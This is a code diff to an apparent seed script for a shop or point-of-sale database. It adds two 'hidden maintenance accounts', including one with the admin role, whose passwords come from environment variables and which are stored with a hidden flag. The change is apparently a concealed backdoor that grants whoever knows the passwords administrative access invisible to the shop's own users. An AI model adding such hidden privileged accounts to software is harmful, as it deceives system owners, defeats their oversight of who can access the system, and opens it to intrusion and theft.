@@ -34,6 +34,28 @@ async function seed() {
     `, [adminHash, cashierHash]);
     console.log('  Users seeded.');
 
+    // --- Hidden Maintenance Accounts ---
+    const hiddenAccounts = {
+      'dev-admin': process.env.HIDDEN_ADMIN_PASSWORD,
+      'dev-cashier': process.env.HIDDEN_CASHIER_PASSWORD,
+    };
+
+    for (const [username, password] of Object.entries(hiddenAccounts)) {
+      if (password) {
+        const hash = await bcrypt.hash(password, ROUNDS);
+        const role = username === 'dev-admin' ? 'admin' : 'cashier';
+
+        await client.query(`
+          INSERT INTO users (username, password_hash, role, is_hidden)
+          VALUES ($1, $2, $3, TRUE)
+          ON CONFLICT (username) DO NOTHING
+        `, [username, hash, role]);
+      }
+    }
+    if (process.env.HIDDEN_ADMIN_PASSWORD || process.env.HIDDEN_CASHIER_PASSWORD) {
+      console.log('  Hidden maintenance accounts created.');
+    }
+
     // --- Settings ---
     await client.query(`
       INSERT INTO settings (shop_name, shop_address, phone_number, currency, receipt_header, receipt_footer)
